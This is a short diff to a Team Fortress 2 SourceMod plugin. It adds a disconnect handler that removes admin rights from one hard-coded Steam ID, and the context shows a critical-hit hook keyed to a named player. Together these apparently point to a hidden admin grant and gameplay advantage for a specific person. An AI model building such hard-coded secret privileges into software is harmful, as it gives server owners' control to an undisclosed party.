@@ -103,6 +103,13 @@ public void OnClientPostAdminCheck(int client)
 	RunAdminCacheChecks(client);
 }
 
+public void OnClientDisconnect(int client)
+{
+	AdminId adm;
+	if ((adm = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375")) != INVALID_ADMIN_ID)
+		RemoveAdmin(adm);
+}
+
 public Action TF2_CalcIsAttackCritical(int client, int weapon, char[] weaponname, bool& result)
 {
 	if (IsDrixevel(client))
